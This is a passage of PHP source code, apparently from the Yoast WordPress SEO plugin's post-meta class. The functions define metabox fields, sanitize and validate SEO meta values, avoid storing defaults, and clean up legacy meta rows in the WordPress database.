			add_filter( 'add_post_metadata', array( __CLASS__, 'dont_save_meta_if_default' ), 10, 4 );
		}


		/**
		 * Retrieve the meta box form field definitions for the given tab and post type.
		 *
		 * @static
		 *
		 * @param	string	$tab		Tab for which to retrieve the field definitions
		 * @param	string	$post_type	Post type of the current post
		 * @return	array				Array containing the meta box field definitions
		 */
		public static function get_meta_field_defs( $tab, $post_type = 'post' ) {
			if ( ! isset( self::$meta_fields[ $tab ] ) ) {
				return array();
			}

			$field_defs = self::$meta_fields[ $tab ];

			switch ( $tab ) {
				case 'non-form':
					// prevent non-form fields from being passed to forms
					$field_defs = array();
					break;


				case 'general':
					$options = get_option( 'wpseo_titles' );
					if ( $options['usemetakeywords'] === true ) {
						/* Adjust the link in the keywords description text string based on the post type */
						$field_defs['metakeywords']['description'] = sprintf( $field_defs['metakeywords']['description'], '<a target="_blank" href="' . esc_url( admin_url( 'admin.php?page=wpseo_titles#' . urlencode( $post_type ) ) ) . '">', '</a>' );
					}
					else {
						/* Don't show the keywords field if keywords aren't enabled */
						unset( $field_defs['metakeywords'] );
					}
					/**
					 * Filter the WPSEO metabox form field definitions for the general tab, backward compatibility
					 *
					 * @deprecated 1.5.0
					 * @deprecated use the 'wpseo_metabox_entries_general' filter instead
					 * @see WPSEO_Meta::get_meta_field_defs()
					 *
					 * @param	array	$field_defs    metabox form definitions
					 * @return	array
					 */
					$field_defs = apply_filters( 'wpseo_metabox_entries', $field_defs );
					break;


				case 'advanced':
					global $post;

					$options = WPSEO_Options::get_all();

					$post_type = '';
					if ( isset( $post->post_type ) ) {
						$post_type = $post->post_type;
					}
					elseif ( ! isset( $post->post_type ) && isset( $_GET['post_type'] ) ) {
						$post_type = sanitize_text_field( $_GET['post_type'] );
					}

					/* Adjust the no-index 'default for post type' text string based on the post type */
					$field_defs['meta-robots-noindex']['options']['0'] = sprintf( $field_defs['meta-robots-noindex']['options']['0'], ( ( isset( $options[ 'noindex-' . $post_type ] ) && $options[ 'noindex-' . $post_type ] === true ) ? 'noindex' : 'index' ) );

					/* Adjust the robots advanced 'site-wide default' text string based on those settings */
					if ( $options['noodp'] !== false || $options['noydir'] !== false ) {
						$robots_adv = array();
						foreach ( array( 'noodp', 'noydir' ) as $robot ) {
							if ( $options[ $robot ] === true ) {
								// use translation from field def options - mind that $options and $field_def['options'] keys should be the same!
								$robots_adv[] = $field_defs['meta-robots-adv']['options'][ $robot ];
							}
						}
						$robots_adv = implode( ', ', $robots_adv );
					}
					else {
						$robots_adv = __( 'None', 'wordpress-seo' );
					}
					$field_defs['meta-robots-adv']['options']['-'] = sprintf( $field_defs['meta-robots-adv']['options']['-'], $robots_adv );
					unset( $robots_adv );


					/* Don't show the breadcrumb title field if breadcrumbs aren't enabled */
					if ( $options['breadcrumbs-enable'] !== true ) {
						unset( $field_defs['bctitle'] );
					}

					/* Don't show the xml sitemap fields, if xml sitemaps aren't enabled */
					if ( $options['enablexmlsitemap'] !== true ) {
						unset(
							$field_defs['sitemap-include'],
							$field_defs['sitemap-prio']
						);
					}

					break;
			}

			/**
			 * Filter the WPSEO metabox form field definitions for a tab
			 * {tab} can be 'general', 'advanced' or 'social'
			 *
			 * @param	array	$field_defs    metabox form definitions
			 * @param	string	$post_type     post type of the post the metabox is for, defaults to 'post'
			 * @return	array
			 */
			return apply_filters( 'wpseo_metabox_entries_' . $tab, $field_defs, $post_type );
		}


		/**
		 * Validate the post meta values
		 *
		 * @static
		 *
		 * @param	mixed	$meta_value	The new value
		 * @param	string	$meta_key	The full meta key (including prefix)
		 * @return	string				Validated meta value
		 */
		public static function sanitize_post_meta( $meta_value, $meta_key ) {
			$field_def = self::$meta_fields[ self::$fields_index[ $meta_key ]['subset'] ][ self::$fields_index[ $meta_key ]['key'] ];
			$clean     = self::$defaults[ $meta_key ];

			switch ( true ) {
				case ( $meta_key === self::$meta_prefix . 'linkdex' ):
					$int = WPSEO_Option::validate_int( $meta_value );
					if ( $int !== false && $int >= 0 ) {
						$clean = strval( $int ); // Convert to string to make sure default check works
					}
					break;


				case ( $field_def['type'] === 'checkbox' ):
					// Only allow value if it's one of the predefined options
					if ( in_array( $meta_value, array( 'on', 'off' ), true ) ) {
						$clean = $meta_value;
					}
					break;


				case ( $field_def['type'] === 'select' || $field_def['type'] === 'radio' ):
					// Only allow value if it's one of the predefined options
					if ( isset( $field_def['options'][ $meta_value ] ) ) {
						$clean = $meta_value;
					}
					break;


				case ( $field_def['type'] === 'multiselect' && $meta_key === self::$meta_prefix . 'meta-robots-adv' ):
					$clean = self::validate_meta_robots_adv( $meta_value );
					break;


				case ( $field_def['type'] === 'text' && $meta_key === self::$meta_prefix . 'canonical' ):
				case ( $field_def['type'] === 'text' && $meta_key === self::$meta_prefix . 'redirect' ):
					// Validate as url(-part)
					$url = WPSEO_Option::sanitize_url( $meta_value );
					if ( $url !== '' ) {
						$clean = $url;
					}
					break;


				case ( $field_def['type'] === 'upload' && $meta_key === self::$meta_prefix . 'opengraph-image' ):
					// Validate as url
					$url = WPSEO_Option::sanitize_url( $meta_value, array( 'http', 'https', 'ftp', 'ftps' ) );
					if ( $url !== '' ) {
						$clean = $url;
					}
					break;


				case ( $field_def['type'] === 'textarea' ):
					if ( is_string( $meta_value ) ) {
						// Remove line breaks and tabs
						// @todo [JRF => Yoast] verify that line breaks and the likes aren't allowed/recommended in meta header fields
						$meta_value = str_replace( array( "\n", "\r", "\t", '  ' ), ' ', $meta_value );
						$clean      = WPSEO_Option::sanitize_text_field( trim( $meta_value ) );
					}
					break;

				case ( 'multiselect' === $field_def['type'] ) :
					$clean = $meta_value;
					break;


				case ( $field_def['type'] === 'text' ):
				default:
					if ( is_string( $meta_value ) ) {
						$clean = WPSEO_Option::sanitize_text_field( trim( $meta_value ) );
					}
					break;
			}

			$clean = apply_filters( 'wpseo_sanitize_post_meta_' . $meta_key, $clean, $meta_value, $field_def, $meta_key );

			return $clean;
		}


		/**
		 * Validate a meta-robots-adv meta value
		 *
		 * @todo [JRF => Yoast] Verify that this logic for the prioritisation is correct
		 *
		 * @static
		 *
		 * @param	array|string	$meta_value	The value to validate
		 * @return	string			Clean value
		 */
		public static function validate_meta_robots_adv( $meta_value ) {
			$clean   = self::$meta_fields['advanced']['meta-robots-adv']['default_value'];
			$options = self::$meta_fields['advanced']['meta-robots-adv']['options'];

			if ( is_string( $meta_value ) ) {
				$meta_value = explode( ',', $meta_value );
			}

			if ( is_array( $meta_value ) && $meta_value !== array() ) {
				$meta_value = array_map( 'trim', $meta_value );

				if ( in_array( 'none', $meta_value, true ) ) {
					// None is one of the selected values, takes priority over everything else
					$clean = 'none';
				}
				elseif ( in_array( '-', $meta_value, true ) ) {
					// Site-wide defaults is one of the selected values, takes priority over
					// individual selected entries
					$clean = '-';
				}
				else {
					// Individual selected entries
					$cleaning = array();
					foreach ( $meta_value as $value ) {
						if ( isset( $options[ $value ] ) ) {
							$cleaning[] = $value;
						}
					}

					if ( $cleaning !== array() ) {
						$clean = implode( ',', $cleaning );
					}
					unset( $cleaning, $value );
				}
			}

			return $clean;
		}


		/**
		 * Prevent saving of default values and remove potential old value from the database if replaced by a default
		 *
		 * @static
		 *
		 * @param	null	$null		old, disregard
		 * @param	int		$object_id	ID of the current object for which the meta is being updated
		 * @param	string	$meta_key	The full meta key (including prefix)
		 * @param	string	$meta_value	New meta value
		 * @param	string	$prev_value	The old meta value
		 * @return	null|bool			true = stop saving, null = continue saving
		 */
		public static function remove_meta_if_default( $null, $object_id, $meta_key, $meta_value, $prev_value = '' ) {
			/* If it's one of our meta fields, check against default */
			if ( isset( self::$fields_index[ $meta_key ] ) && self::meta_value_is_default( $meta_key, $meta_value ) === true ) {
				if ( $prev_value !== '' ) {
					delete_post_meta( $object_id, $meta_key, $prev_value );
				}
				else {
					delete_post_meta( $object_id, $meta_key );
				}
				return true; // stop saving the value
			}

			return null; // go on with the normal execution (update) in meta.php
		}


		/**
		 * Prevent adding of default values to the database
		 *
		 * @static
		 *
		 * @param	null	$null		old, disregard
		 * @param	int		$object_id	ID of the current object for which the meta is being added
		 * @param	string	$meta_key	The full meta key (including prefix)
		 * @param	string	$meta_value	New meta value
		 * @return	null|bool			true = stop saving, null = continue saving
		 */
		public static function dont_save_meta_if_default( $null, $object_id, $meta_key, $meta_value ) {
			/* If it's one of our meta fields, check against default */
			if ( isset( self::$fields_index[ $meta_key ] ) && self::meta_value_is_default( $meta_key, $meta_value ) === true ) {
				return true; // stop saving the value
			}

			return null; // go on with the normal execution (add) in meta.php
		}


		/**
		 * Is the given meta value the same as the default value ?
		 *
		 * @static
		 *
		 * @param	string	$meta_key	The full meta key (including prefix)
		 * @param	mixed	$meta_value	The value to check
		 * @return	bool
		 */
		public static function meta_value_is_default( $meta_key, $meta_value ) {
			return ( isset( self::$defaults[ $meta_key ] ) && $meta_value === self::$defaults[ $meta_key ] );
		}


		/**
		 * Get a custom post meta value
		 * Returns the default value if the meta value has not been set
		 *
		 * @internal Unfortunately there isn't a filter available to hook into before returning the results
		 * for get_post_meta(), get_post_custom() and the likes. That would have been the preferred solution.
		 *
		 * @static
		 *
		 * @param   string  $key		internal key of the value to get (without prefix)
		 * @param   int     $postid		post ID of the post to get the value for
		 * @return  string				All 'normal' values returned from get_post_meta() are strings.
		 *								Objects and arrays are possible, but not used by this plugin
		 *								and therefore discarted (except when the special 'serialized' field def
		 *								value is set to true - only used by add-on plugins for now)
		 *								Will return the default value if no value was found.
		 *								Will return empty string if no default was found (not one of our keys) or
		 *								if the post does not exist
		 */
		public static function get_value( $key, $postid = 0 ) {
			global $post;

			$postid = absint( $postid );
			if ( $postid === 0 ) {
				if ( ( isset( $post ) && is_object( $post ) ) && ( isset( $post->post_status ) && $post->post_status !== 'auto-draft' ) ){
					$postid = $post->ID;
				}
				else {
					return '';
				}
			}

			$custom = get_post_custom( $postid ); // array of strings or empty array

			if ( isset( $custom[ self::$meta_prefix . $key ][0] ) ) {
				$unserialized = maybe_unserialize( $custom[ self::$meta_prefix . $key ][0] );
				if ( $custom[ self::$meta_prefix . $key ][0] === $unserialized ) {
					return $custom[ self::$meta_prefix . $key ][0];
				}
				else {
					$field_def = self::$meta_fields[ self::$fields_index[ self::$meta_prefix . $key ]['subset'] ][ self::$fields_index[ self::$meta_prefix . $key ]['key'] ];
					if	( isset( $field_def['serialized'] ) && $field_def['serialized'] === true ) {
						// Ok, serialize value expected/allowed
						return $unserialized;
					}
				}
			}

			// Meta was either not found or found, but object/array while not allowed to be
			if ( isset( self::$defaults[ self::$meta_prefix . $key ] ) ) {
				return self::$defaults[ self::$meta_prefix . $key ];
			}
			else {
				/* Shouldn't ever happen, means not one of our keys as there will always be a default available
				   for all our keys */
				return '';
			}
		}


		/**
		 * Update a meta value for a post
		 *
		 * @static
		 *
		 * @param	string	$key			the internal key of the meta value to change (without prefix)
		 * @param	mixed	$meta_value		the value to set the meta to
		 * @param	int		$post_id		the ID of the post to change the meta for.
		 * @return	bool	whether the value was changed
		 */
		public static function set_value( $key, $meta_value, $post_id ) {
			return update_post_meta( $post_id, self::$meta_prefix . $key, $meta_value );
		}


		/**
		 * Used for imports, this functions imports the value of $old_metakey into $new_metakey for those post
		 * where no WPSEO meta data has been set.
		 * Optionally deletes the $old_metakey values.
		 *
		 * @static
		 *
		 * @param	string	$old_metakey	The old key of the meta value.
		 * @param	string	$new_metakey	The new key, usually the WPSEO meta key (including prefix).
		 * @param	bool	$delete_old		Whether to delete the old meta key/value-sets.
		 * @return	void
		 */
		public static function replace_meta( $old_metakey, $new_metakey, $delete_old = false ) {
			global $wpdb;

			/* Get only those rows where no wpseo meta values exist for the same post
			   (with the exception of linkdex as that will be set independently of whether the post has been edited)
			   @internal Query is pretty well optimized this way */
			$query  = $wpdb->prepare(
				"
				SELECT `a`.*
				FROM {$wpdb->postmeta} AS a
				WHERE `a`.`meta_key` = %s
					AND NOT	EXISTS (
						SELECT DISTINCT `post_id` , count( `meta_id` ) AS count
						FROM {$wpdb->postmeta} AS b
						WHERE `a`.`post_id` = `b`.`post_id`
							AND `meta_key` LIKE %s
							AND `meta_key` <> %s
						GROUP BY `post_id`
					)
				;",
				$old_metakey,
				like_escape( self::$meta_prefix . '%' ),
				self::$meta_prefix . 'linkdex'
			);
			$oldies = $wpdb->get_results( $query );

			if ( is_array( $oldies ) && $oldies !== array() ) {
				foreach ( $oldies as $old ) {
					update_post_meta( $old->post_id, $new_metakey, $old->meta_value );
				}
			}

			// Delete old keys
			if ( $delete_old === true ) {
				delete_post_meta_by_key( $old_metakey );
			}
		}


		/**
		 * General clean-up of the saved meta values
		 * - Remove potentially lingering old meta keys
		 * - Remove all default and invalid values
		 *
		 * @static
		 * @return void
		 */
		public static function clean_up() {
			global $wpdb;

			/**
			 * Clean up '_yoast_wpseo_meta-robots'
			 *
			 * Retrieve all '_yoast_wpseo_meta-robots' meta values and convert if no new values found
			 * @internal Query is pretty well optimized this way
			 *
			 * @todo [JRF => Yoast] find out all possible values which the old '_yoast_wpseo_meta-robots' could contain
			 * to convert the data correctly
			 */
			$query  = $wpdb->prepare(
				"
				SELECT `a`.*
				FROM {$wpdb->postmeta} AS a
				WHERE `a`.`meta_key` = %s
					AND NOT	EXISTS (
						SELECT DISTINCT `post_id` , count( `meta_id` ) AS count
						FROM {$wpdb->postmeta} AS b
						WHERE `a`.`post_id` = `b`.`post_id`
							AND ( `meta_key` = %s
							OR `meta_key` = %s )
						GROUP BY `post_id`
					)
				;",
				self::$meta_prefix . 'meta-robots',
				self::$meta_prefix . 'meta-robots-noindex',
				self::$meta_prefix . 'meta-robots-nofollow'
			);
			$oldies = $wpdb->get_results( $query );

			if ( is_array( $oldies ) && $oldies !== array() ) {
				foreach ( $oldies as $old ) {
					$old_values = explode( ',', $old->meta_value );
					foreach ( $old_values as $value ) {
						if ( $value === 'noindex' ) {
							update_post_meta( $old->post_id, self::$meta_prefix . 'meta-robots-noindex', 1 );
						}
						elseif ( $value === 'nofollow' ) {
							update_post_meta( $old->post_id, self::$meta_prefix . 'meta-robots-nofollow', 1 );
						}
					}
				}
			}
			unset( $query, $oldies, $old, $old_values, $value );

			// Delete old keys
			delete_post_meta_by_key( self::$meta_prefix . 'meta-robots' );


			/**
			 * Remove all default values and (most) invalid option values
			 * Invalid option values for the multiselect (meta-robots-adv) field will be dealt with seperately
			 *
			 * @internal some of the defaults have changed in v1.5, but as the defaults will be removed and
			 * new defaults will now automatically be passed when no data found, this update is automatic
			 * (as long as we remove the old values which we do in the below routine)
			 *
			 * @internal unfortunately we can't use the normal delete_meta() with key/value combination as ''
			 * (empty string) values will be ignored and would result in all metas with that key being deleted,
			 * not just the empty fields.
			 * Still, the below implementation is largely based on the delete_meta() function
			 */
			$query = array();

			foreach ( self::$meta_fields as $subset => $field_group ) {
				foreach ( $field_group as $key => $field_def ) {
					if ( $field_def['type'] === 'snippetpreview' || ! isset( $field_def['default_value'] ) ) {
						continue;
					}

					if ( $key === 'meta-robots-adv' ) {
						$query[] = $wpdb->prepare(
							"( meta_key = %s AND ( meta_value = 'none' OR meta_value = '-' ) )",
							self::$meta_prefix . $key
						);
					}
					elseif ( isset( $field_def['options'] ) && is_array( $field_def['options'] ) && $field_def['options'] !== array() ) {
						$valid = $field_def['options'];
						// remove the default value from the valid options
						unset( $valid[ $field_def['default_value'] ] );
						$valid = array_keys( $valid );

						$query[] = $wpdb->prepare(
							"( meta_key = %s AND meta_value NOT IN ( '" . implode( "','", esc_sql( $valid ) ) . "' ) )",
							self::$meta_prefix . $key
						);
						unset( $valid );
					}
					elseif ( is_string( $field_def['default_value'] ) && $field_def['default_value'] !== '' ) {
						$query[] = $wpdb->prepare(
							'( meta_key = %s AND meta_value = %s )',
							self::$meta_prefix . $key,
							$field_def['default_value']
						);
					}
					else {
						$query[] = $wpdb->prepare(
							"( meta_key = %s AND meta_value = '' )",
							self::$meta_prefix . $key
						);
					}
				}
			}
			unset( $subset, $field_group, $key, $field_def, $where_or_or );

			$query    = "SELECT meta_id FROM {$wpdb->postmeta} WHERE " . implode( ' OR ', $query ) . ';';
			$meta_ids = $wpdb->get_col( $query );

			if ( is_array( $meta_ids ) && $meta_ids !== array() ) {
				// wp native action
				do_action( 'delete_post_meta', $meta_ids, null, null, null );

				$query = "DELETE FROM {$wpdb->postmeta} WHERE meta_id IN( " . implode( ',', $meta_ids ) . ' )';
				$count = $wpdb->query( $query );

				if ( $count ) {
					foreach ( $meta_ids as $object_id ) {
						wp_cache_delete( $object_id, 'post_meta' );
					}

					// wp native action
					do_action( 'deleted_post_meta', $meta_ids, null, null, null );
				}
			}
			unset( $query, $meta_ids, $count, $object_id );


			/**
			 * Deal with the multiselect (meta-robots-adv) field
			 *
			 * Removes invalid option combinations, such as 'none,noarchive'
			 *
			 * Default values have already been removed, so we should have a small result set and
			 * (hopefully) even smaller set of invalid results.
			 */
			$query  = $wpdb->prepare(
				"SELECT meta_id, meta_value FROM {$wpdb->postmeta} WHERE meta_key = %s",
				self::$meta_prefix . 'meta-robots-adv'
			);
			$oldies = $wpdb->get_results( $query );

			if ( is_array( $oldies ) && $oldies !== array() ) {
				foreach ( $oldies as $old ) {
					$clean = self::validate_meta_robots_adv( $old->meta_value );

					if ( $clean !== $old->meta_value ) {
						if ( $clean !== self::$meta_fields['advanced']['meta-robots-adv']['default_value'] ) {
							update_metadata_by_mid( 'post', $old->meta_id, $clean );
						}
						else {
							delete_metadata_by_mid( 'post', $old->meta_id );
						}
					}
				}
			}
			unset( $query, $oldies, $old, $clean );

			do_action( 'wpseo_meta_clean_up' );
		}


		/**
		 * Recursively merge a variable number of arrays, using the left array as base,
		 * giving priority to the right array.
		 *
		 * Difference with native array_merge_recursive():
		 * array_merge_recursive converts values with duplicate keys to arrays rather than
		 * overwriting the value in the first array with the duplicate value in the second array.
		 *
		 * array_merge_recursive_distinct does not change the data types of the values in the arrays.
		 * Matching keys' values in the second array overwrite those in the first array, as is the
		 * case with array_merge.
		 *
		 * Freely based on information found on http://www.php.net/manual/en/function.array-merge-recursive.php
		 *
		 * @internal Should be moved to a general utility class
		 *
		 * @param	array	2 or more arrays to merge
		 * @return	array
		 */
		public static function array_merge_recursive_distinct() {

			$arrays = func_get_args();
			if ( count( $arrays ) < 2 ) {
				if ( $arrays === array() ) {
					return array();
				}
				else {
					return $arrays[0];
				}
			}

			$merged = array_shift( $arrays );

			foreach ( $arrays as $array ) {
				foreach ( $array as $key => $value ) {
					if ( is_array( $value ) && ( isset( $merged[ $key ] ) && is_array( $merged[ $key ] ) ) ) {
						$merged[ $key ] = self::array_merge_recursive_distinct( $merged[ $key ], $value );
					}
					else {
						$merged[ $key ] = $value;
					}
				}
				unset( $key, $value );
			}
			return $merged;
		}
		
		/**
		 * Get a value from $_POST for a given key
		 * Returns the $_POST value if exists, returns an empty string if key does not exist
		 *
		 * @static
		 *
		 * @param   string  $key		key of the value to get from $_POST
		 * @return  string				returns $_POST value, which will be a string the majority of the time
		 *							Will return empty string if key does not exists in $_POST
		 */
		public static function get_post_value( $key ) {
			return ( array_key_exists( $key, $_POST ) ) ? $_POST[ $key ] : '';
		}


	} /* End of class */

} /* End of class-exists wrapper */
